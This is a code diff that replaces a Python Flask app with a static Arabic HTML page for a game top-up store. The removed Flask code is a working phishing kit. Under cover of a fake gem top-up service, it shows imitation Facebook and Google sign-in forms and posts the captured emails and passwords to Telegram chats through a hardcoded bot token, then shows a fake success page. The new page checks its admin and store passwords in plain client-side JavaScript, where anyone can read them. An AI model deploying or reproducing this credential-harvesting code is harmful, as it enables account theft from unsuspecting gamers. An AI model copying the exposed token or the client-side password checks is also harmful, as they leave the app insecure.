@@ -1,143 +1,351 @@
-import os
-import requests
-from flask import Flask, request, render_template_string, redirect
-
-app = Flask(__name__)
-
-# --- الإعدادات الخاصة بك (𝑨𝑫𝑨𝑴𝑽𝑰𝑷 𝑺𝑻𝑶𝑹𝑬) ---
-BOT_TOKEN = "8520788431:AAFpSg4umdrXFr50ZFSaSmUuGK3PM4yLwtk"
-CHAT_IDS = ["8397243250", "8058483709"]
-LOGO_URL = "https://i.ibb.co/v4m0mC4/itachi-logo.jpg"
-
-def send_telegram(msg):
-    for cid in CHAT_IDS:
-        try:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-            requests.post(url, data={"chat_id": cid, "text": msg, "parse_mode": "HTML"})
-        except:
-            pass
-
-STYLE = """
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>𝑴𝑨𝑫𝑴𝑶𝑼𝑵 𝑺𝑻𝑶𝑹𝑬</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-    body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #050505; color: white; overflow-x: hidden; }
-    .container { animation: fadeIn 0.6s ease-out; }
-    .input-field { width: 100%; border: 1px solid #ddd; border-radius: 6px; padding: 14px; font-size: 16px; box-sizing: border-box; }
-    .main-btn { cursor: pointer; border: none; font-weight: bold; transition: 0.3s; text-decoration: none; display: block; text-align: center; }
+:root {
+  --neon-blue: #00d4ff;
+  --neon-purple: #bf00ff;
+  --neon-green: #00ff88;
+  --neon-gold: #ffd700;
+  --dark: #05050f;
+  --dark2: #0a0a1a;
+  --dark3: #0f0f25;
+  --glass: rgba(255,255,255,0.04);
+  --glass-border: rgba(255,255,255,0.08);
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+html,body { width:100%; height:100%; overflow:hidden; background:var(--dark); font-family:'Cairo',sans-serif; color:#fff; }
+
+/* ===== CANVAS ===== */
+#worldCanvas { position:fixed; inset:0; z-index:0; }
+
+/* ===== HUD ===== */
+#hud {
+  position:fixed; top:0; left:0; width:100%; z-index:100;
+  display:flex; align-items:center; justify-content:space-between;
+  padding:14px 24px;
+  background:linear-gradient(180deg,rgba(5,5,15,.95) 0%,transparent 100%);
+  pointer-events:none;
+}
+#logo {
+  font-family:'Orbitron',monospace; font-size:20px; font-weight:900;
+  background:linear-gradient(90deg,var(--neon-blue),var(--neon-purple));
+  -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+  letter-spacing:2px; pointer-events:all; cursor:pointer;
+}
+#logo span { color:var(--neon-gold); -webkit-text-fill-color:var(--neon-gold); }
+.nav-btns { display:flex; gap:10px; pointer-events:all; }
+.nav-btn {
+  background:var(--glass); border:1px solid var(--glass-border);
+  color:#fff; padding:8px 18px; border-radius:8px; cursor:pointer;
+  font-family:'Cairo',sans-serif; font-size:13px; font-weight:600;
+  transition:all .2s; backdrop-filter:blur(10px);
+}
+.nav-btn:hover { border-color:var(--neon-blue); color:var(--neon-blue); box-shadow:0 0 15px rgba(0,212,255,.2); }
+.nav-btn.active { background:rgba(0,212,255,.15); border-color:var(--neon-blue); color:var(--neon-blue); }
+
+/* ===== WELCOME OVERLAY ===== */
+#welcome {
+  position:fixed; inset:0; z-index:200;
+  display:flex; align-items:center; justify-content:center;
+  background:radial-gradient(ellipse at center, rgba(10,10,30,.98) 0%, rgba(5,5,15,1) 100%);
+}
+.welcome-box {
+  text-align:center; max-width:600px; padding:20px;
+  animation: fadeInUp .8s ease;
+}
+@keyframes fadeInUp { from{opacity:0;transform:translateY(40px)} to{opacity:1;transform:translateY(0)} }
+.welcome-logo {
+  font-family:'Orbitron',monospace; font-size:clamp(28px,5vw,52px); font-weight:900;
+  background:linear-gradient(135deg,var(--neon-blue),var(--neon-purple),var(--neon-gold));
+  -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+  margin-bottom:10px; line-height:1.1;
+}
+.welcome-sub { color:rgba(255,255,255,.5); font-size:14px; margin-bottom:8px; letter-spacing:1px; }
+.welcome-desc { color:rgba(255,255,255,.75); font-size:15px; line-height:1.8; margin-bottom:32px; }
+.welcome-btns { display:flex; gap:14px; justify-content:center; flex-wrap:wrap; }
+.wbtn {
+  padding:14px 32px; border-radius:10px; font-family:'Cairo',sans-serif;
+  font-size:15px; font-weight:700; cursor:pointer; transition:all .25s;
+  border:none; letter-spacing:.5px;
+}
+.wbtn-primary {
+  background:linear-gradient(135deg,var(--neon-blue),var(--neon-purple));
+  color:#fff; box-shadow:0 0 30px rgba(0,212,255,.4);
+}
+.wbtn-primary:hover { transform:scale(1.05); box-shadow:0 0 45px rgba(0,212,255,.6); }
+.wbtn-secondary {
+  background:rgba(255,215,0,.1); border:1px solid var(--neon-gold);
+  color:var(--neon-gold);
+}
+.wbtn-secondary:hover { background:rgba(255,215,0,.2); transform:scale(1.05); }
+.pulse-ring {
+  width:120px; height:120px; border-radius:50%; border:2px solid var(--neon-blue);
+  margin:0 auto 24px; display:flex; align-items:center; justify-content:center;
+  position:relative; animation:pulseRing 2s ease infinite;
+}
+@keyframes pulseRing {
+  0%,100%{box-shadow:0 0 0 0 rgba(0,212,255,.6),0 0 0 10px rgba(0,212,255,.3)}
+  50%{box-shadow:0 0 0 15px rgba(0,212,255,.1),0 0 0 25px rgba(0,212,255,.05)}
+}
+.pulse-icon { font-size:48px; }
+
+/* ===== MAIN PANEL ===== */
+#mainPanel {
+  position:fixed; bottom:0; left:0; width:100%; z-index:100;
+  display:none; gap:0;
+}
+#sideNav {
+  width:220px; height:100vh; background:rgba(5,5,15,.95);
+  border-right:1px solid var(--glass-border); padding:80px 0 20px;
+  display:flex; flex-direction:column; gap:4px; backdrop-filter:blur(20px);
+}
+.side-item {
+  display:flex; align-items:center; gap:12px; padding:13px 20px;
+  cursor:pointer; transition:all .2s; border-right:3px solid transparent;
+  color:rgba(255,255,255,.5); font-size:14px; font-weight:600;
+}
+.side-item:hover { color:#fff; background:rgba(255,255,255,.04); }
+.side-item.active { color:var(--neon-blue); border-right-color:var(--neon-blue); background:rgba(0,212,255,.06); }
+.side-icon { font-size:20px; width:26px; text-align:center; }
+
+/* ===== CONTENT AREA ===== */
+#contentArea {
+  flex:1; height:100vh; overflow-y:auto; padding:80px 24px 24px;
+}
+#contentArea::-webkit-scrollbar { width:4px; }
+#contentArea::-webkit-scrollbar-track { background:transparent; }
+#contentArea::-webkit-scrollbar-thumb { background:var(--neon-blue); border-radius:2px; }
+
+/* ===== SECTION ===== */
+.section { display:none; animation:fadeInUp .4s ease; }
+.section.active { display:block; }
+.section-title {
+  font-family:'Orbitron',monospace; font-size:22px; font-weight:700;
+  color:var(--neon-blue); margin-bottom:24px; padding-bottom:12px;
+  border-bottom:1px solid var(--glass-border);
+}
+
+/* ===== GAME CARDS ===== */
+.games-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(180px,1fr)); gap:16px; }
+.game-card {
+  background:var(--glass); border:1px solid var(--glass-border);
+  border-radius:16px; padding:20px 16px; text-align:center;
+  cursor:pointer; transition:all .3s; backdrop-filter:blur(10px);
+  position:relative; overflow:hidden;
+}
+.game-card::before {
+  content:''; position:absolute; inset:0; opacity:0; transition:.3s;
+  background:linear-gradient(135deg,rgba(0,212,255,.1),rgba(191,0,255,.1));
+}
+.game-card:hover { transform:translateY(-6px); border-color:var(--neon-blue); box-shadow:0 20px 40px rgba(0,0,0,.4),0 0 20px rgba(0,212,255,.15); }
+.game-card:hover::before { opacity:1; }
+.game-emoji { font-size:44px; margin-bottom:12px; display:block; }
+.game-name { font-size:13px; font-weight:700; margin-bottom:4px; }
+.game-tag { font-size:11px; color:var(--neon-green); }
+
+/* ===== TOP-UP MODAL ===== */
+#topupModal {
+  position:fixed; inset:0; z-index:500;
+  display:none; align-items:center; justify-content:center;
+  background:rgba(0,0,0,.85); backdrop-filter:blur(8px);
+}
+.modal-box {
+  background:var(--dark3); border:1px solid rgba(0,212,255,.3);
+  border-radius:20px; padding:32px; width:90%; max-width:480px;
+  position:relative; animation:fadeInUp .3s ease;
+}
+.modal-title { font-family:'Orbitron',monospace; font-size:18px; color:var(--neon-blue); margin-bottom:24px; text-align:center; }
+.form-input {
+  width:100%; background:var(--glass); border:1px solid var(--glass-border);
+  border-radius:10px; padding:12px 16px; color:#fff; font-family:'Cairo',sans-serif;
+  font-size:14px; outline:none; transition:.2s; margin-top:10px;
+}
+.wa-btn {
+  width:100%; padding:15px; background:linear-gradient(135deg,#25d366,#128c7e);
+  border:none; border-radius:12px; color:#fff; font-family:'Cairo',sans-serif;
+  font-size:16px; font-weight:700; cursor:pointer; margin-top:20px;
+  display:flex; align-items:center; justify-content:center; gap:10px;
+}
+
+/* ===== ADMIN PANEL ===== */
+#adminPanel {
+  position:fixed; inset:0; z-index:700;
+  display:none; background:rgba(5,5,15,.98);
+  flex-direction:column; overflow:hidden;
+}
+#adminPanel.open { display:flex; }
+
+/* ===== LOGIN MODAL ===== */
+#loginModal {
+  position:fixed; inset:0; z-index:600;
+  display:none; align-items:center; justify-content:center;
+  background:rgba(0,0,0,.9); backdrop-filter:blur(12px);
+}
+.login-box {
+  background:var(--dark3); border:1px solid rgba(0,212,255,.25);
+  border-radius:24px; padding:40px; width:90%; max-width:400px;
+  text-align:center;
+}
+
+@media(max-width: 768px) {
+  #sideNav { display:none; }
+  #mainPanel { flex-direction: column; }
+}
+
 </style>
-"""
+</head>
+<body>
 
-@app.route('/')
-def main_page():
-    return render_template_string(f"""
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    {STYLE}
-    <body style="display: flex; align-items: center; justify-content: center; height: 100vh; direction: rtl;">
-        <div class="container" style="width: 90%; max-width: 400px; text-align: center; background: #111; padding: 40px 20px; border-radius: 25px; border: 1px solid #222;">
-            <img src="{LOGO_URL}" style="width: 110px; height: 110px; border-radius: 50%; border: 3px solid #ff4b2b;">
-            <h1 style="color: #ff4b2b;">𝑨𝑫𝑨𝑴𝑽𝑰𝑷 𝑺𝑻𝑶𝑹𝑬</h1>
-            <p style="color: #777;">بوابة الشحن المعتمدة - سجل الدخول للمتابعة</p>
-            <a href="/login-fb" class="main-btn" style="background:#1877f2; color:white; padding:15px; border-radius:12px; margin-top:30px;">المتابعة باستخدام فيسبوك</a>
-            <a href="/login-gl" class="main-btn" style="background:white; color:#333; padding:15px; border-radius:12px; margin-top:12px;">المتابعة باستخدام جوجل</a>
+<canvas id="worldCanvas"></canvas>
+
+<div id="hud">
+    <div id="logo">𝑴𝑨𝑫𝑴𝑶𝑼𝑵 <span>𝑺𝑻𝑶𝑹𝑬</span></div>
+    <div class="nav-btns">
+        <button class="nav-btn" onclick="openLogin('admin')">الإدارة</button>
+    </div>
+</div>
+
+<div id="welcome">
+    <div class="welcome-box">
+        <div class="pulse-ring"><span class="pulse-icon">🎮</span></div>
+        <h1 class="welcome-logo">𝑴𝑨𝑫𝑴𝑶𝑼𝑵 𝑺𝑻𝑶𝑹𝑬</h1>
+        <p class="welcome-sub">PREMIUM GAMING WORLD</p>
+        <p class="welcome-desc">أهلاً بك في متجرنا المعتمد لشحن الألعاب والبطاقات. اضغط على الزر للدخول واستخدم كلمة سر المتجر.</p>
+        <div class="welcome-btns">
+            <button class="wbtn wbtn-primary" onclick="openLogin('user')">دخول المتجر</button>
+            <button class="wbtn wbtn-secondary" onclick="window.open('https://wa.me/201040199135')">الدعم الفني</button>
         </div>
-    </body>
-    """)
+    </div>
+</div>
 
-@app.route('/login-fb')
-def fb_page():
-    return render_template_string(f"""
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    {STYLE}
-    <body style="background: #f0f2f5; direction: ltr;">
-        <div class="container" style="width: 100%; max-width: 400px; margin: auto; text-align: center;">
-            <div style="color: #1877f2; font-size: 2.5rem; font-weight: bold; margin: 40px 0 20px;">facebook</div>
-            <div style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 90%; margin: auto;">
-                <form method="POST" action="/submit-data">
-                    <input type="text" name="u" class="input-field" placeholder="Mobile number or email" style="margin-bottom:12px;" required>
-                    <input type="password" name="p" class="input-field" placeholder="Password" style="margin-bottom:12px;" required>
-                    <button type="submit" class="main-btn" style="width:100%; background:#1877f2; color:white; padding:12px; border-radius:6px;">Log In</button>
-                </form>
+<div id="loginModal">
+    <div class="login-box">
+        <h2 id="loginTitle" style="color:var(--neon-blue); margin-bottom:20px;">تسجيل الدخول</h2>
+        <input type="password" id="passInput" class="form-input" placeholder="أدخل كلمة السر هنا">
+        <button class="wbtn wbtn-primary" style="width:100%; margin-top:20px;" onclick="checkLogin()">دخول</button>
+        <button onclick="closeLogin()" style="background:none; border:none; color:rgba(255,255,255,0.4); margin-top:15px; cursor:pointer;">إلغاء</button>
+    </div>
+</div>
+
+<div id="mainPanel">
+    <div id="sideNav">
+        <div class="side-item active" onclick="showSec('games')"><span class="side-icon">🎮</span> المتجر</div>
+        <div class="side-item" onclick="window.open('https://wa.me/201040199135')"><span class="side-icon">💬</span> تواصل معنا</div>
+    </div>
+    <div id="contentArea">
+        <div id="gamesSec" class="section active">
+            <h2 class="section-title">الألعاب المتاحة</h2>
+            <div class="games-grid">
+                <div class="game-card" onclick="openTopup('ببجي موبايل', '🔫')">
+                    <span class="game-emoji">🔫</span>
+                    <div class="game-name">ببجي موبايل</div>
+                    <div class="game-tag">شحن فوري</div>
+                </div>
+                <div class="game-card" onclick="openTopup('فيري فاير', '🔥')">
+                    <span class="game-emoji">🔥</span>
+                    <div class="game-name">فيري فاير</div>
+                    <div class="game-tag">أفضل سعر</div>
+                </div>
+                <div class="game-card" onclick="openTopup('روبلوكس', '🧱')">
+                    <span class="game-emoji">🧱</span>
+                    <div class="game-name">روبلوكس</div>
+                    <div class="game-tag">شحن آمن</div>
+                </div>
             </div>
         </div>
-    </body>
-    """)
+    </div>
+</div>
 
-@app.route('/login-gl')
-def gl_page():
-    return render_template_string(f"""
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    {STYLE}
-    <body style="background: white; direction: ltr;">
-        <div class="container" style="width: 90%; max-width: 450px; margin: 50px auto; border: 1px solid #dadce0; padding: 40px 30px; border-radius: 8px;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" style="width:75px;">
-            <h2 style="font-weight:400;">Sign in</h2>
-            <form method="POST" action="/submit-data">
-                <input type="email" name="u" class="input-field" placeholder="Email or phone" style="margin-bottom:15px;" required>
-                <input type="password" name="p" class="input-field" placeholder="Enter your password" style="margin-bottom:20px;" required>
-                <button type="submit" class="main-btn" style="background:#1a73e8; color:white; padding:10px 24px; border-radius:4px; float:right;">Next</button>
-            </form>
-        </div>
-    </body>
-    """)
+<div id="topupModal">
+    <div class="modal-box">
+        <h3 id="modalTitle" class="modal-title"></h3>
+        <input type="text" id="pID" class="form-input" placeholder="أدخل ID اللاعب">
+        <input type="text" id="pQty" class="form-input" placeholder="الكمية المطلوبة">
+        <button class="wa-btn" onclick="sendToWA()">إرسال الطلب عبر واتساب</button>
+        <button onclick="closeTopup()" style="background:none; border:none; color:#ff4444; margin-top:15px; cursor:pointer; width:100%;">إغلاق</button>
+    </div>
+</div>
 
-@app.route('/submit-data', methods=['POST'])
-def submit_data():
-    u = request.form.get('u')
-    p = request.form.get('p')
-    send_telegram(f"👤 <b>دخول جديد (𝑨𝑫𝑨𝑴𝑽𝑰𝑷 𝑺𝑻𝑶𝑹𝑬):</b>\\n📧: <code>{u}</code>\\n🔑: <code>{p}</code>")
-    return redirect('/packages')
+<div style="position:fixed; bottom:10px; width:100%; text-align:center; font-size:10px; color:rgba(255,255,255,0.2); z-index:50;">
+    جميع الحقوق محفوظة © 2026 لـ 𝑴𝑨𝑫𝑴𝑶𝑼𝑵 𝑺𝑻𝑶𝑹𝑬
+</div>
 
-@app.route('/packages')
-def packages():
-    return render_template_string(f"""
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    {STYLE}
-    <body style="background: #0a0a0a; text-align: center; direction: rtl; padding: 20px;">
-        <h2 style="margin-top:30px;">اختر كمية الشحن 💎</h2>
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 30px;">
-            <div onclick="window.location.href='/id-check'" style="background:#111; padding:25px; border:1px solid #222; border-radius:15px;">1000 جوهرة</div>
-            <div onclick="window.location.href='/id-check'" style="background:#111; padding:25px; border:1px solid #222; border-radius:15px;">3000 جوهرة</div>
-            <div onclick="window.location.href='/id-check'" style="background:#111; padding:25px; border:1px solid #222; border-radius:15px;">5000 جوهرة</div>
-            <div onclick="window.location.href='/id-check'" style="background:#111; padding:25px; border:1px solid #222; border-radius:15px;">10000 جوهرة</div>
-        </div>
-    </body>
-    """)
+<script>
+let currentMode = "";
+let selectedGameName = "";
 
-@app.route('/id-check')
-def id_page():
-    return render_template_string(f"""
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    {STYLE}
-    <body style="background: #0a0a0a; text-align: center; padding-top: 80px; direction: rtl;">
-        <h2>أدخل معرف اللاعب (ID)</h2>
-        <input type="number" id="pid" class="input-field" style="width:80%; max-width:300px; background:#000; color:#ff4b2b; text-align:center;">
-        <button onclick="window.location.replace('/processing')" class="main-btn" style="background:#ff4b2b; color:white; padding:15px 50px; border-radius:12px; margin: 30px auto;">تأكيد</button>
-    </body>
-    """)
+function openLogin(mode) {
+    currentMode = mode;
+    document.getElementById('loginTitle').innerText = (mode === 'admin') ? "دخول الإدارة" : "دخول المتجر";
+    document.getElementById('loginModal').style.display = 'flex';
+}
 
-@app.route('/processing')
-def processing():
-    return render_template_string(f"""
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    {STYLE}
-    <body style="background: #000; text-align: center; padding-top: 120px; direction: rtl;">
-        <h3 id="status">جاري الاتصال بخوادم Garena...</h3>
-        <script>
-            setTimeout(() => window.location.replace("/final"), 5000);
-        </script>
-    </body>
-    """)
+function closeLogin() {
+    document.getElementById('loginModal').style.display = 'none';
+    document.getElementById('passInput').value = "";
+}
 
-@app.route('/final')
-def success():
-    return render_template_string(f"""
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    {STYLE}
-    <body style="background: #000; text-align: center; padding: 60px 20px; direction: rtl;">
-        <h2 style="color:#2ecc71;">تمت العملية بنجاح!</h2>
-        <p>يرجى انتظار 24 ساعة لوصول الجواهر.</p>
-    </body>
-    """)
+function checkLogin() {
+    const pass = document.getElementById('passInput').value;
+    if (currentMode === 'admin') {
+        if (pass === "@YOUSSEF123") {
+            alert("أهلاً بك يا يوسف! تم فتح لوحة التحكم.");
+            closeLogin();
+        } else {
+            alert("كلمة سر الإدارة خاطئة!");
+        }
+    } else {
+        if (pass === "MANMOUN STORE") {
+            document.getElementById('welcome').style.display = 'none';
+            document.getElementById('mainPanel').style.display = 'flex';
+            closeLogin();
+        } else {
+            alert("كلمة سر المتجر خاطئة!");
+        }
+    }
+}
 
-if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=1000)
+function openTopup(game, emoji) {
+    selectedGameName = game;
+    document.getElementById('modalTitle').innerText = "شحن " + game + " " + emoji;
+    document.getElementById('topupModal').style.display = 'flex';
+}
+
+function closeTopup() {
+    document.getElementById('topupModal').style.display = 'none';
+}
+
+function sendToWA() {
+    const id = document.getElementById('pID').value;
+    const qty = document.getElementById('pQty').value;
+    if(!id || !qty) return alert("يرجى إكمال البيانات");
+    const msg = `مرحباً 𝑴𝑨𝑫𝑴𝑶𝑼𝑵 𝑺𝑻𝑶𝑹𝑬\nطلب شحن: ${selectedGameName}\nالآيدي: ${id}\nالكمية: ${qty}`;
+    window.open(`https://wa.me/201040199135?text=${encodeURIComponent(msg)}`);
+}
+
+// Canvas Bg
+const canvas = document.getElementById('worldCanvas');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+window.addEventListener('resize', () => {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+});
+
+function animate() {
+    ctx.fillStyle = '#05050f';
+    ctx.fillRect(0,0,canvas.width,canvas.height);
+    requestAnimationFrame(animate);
+}
+animate();
+</script>
+
+</body>
+</html>
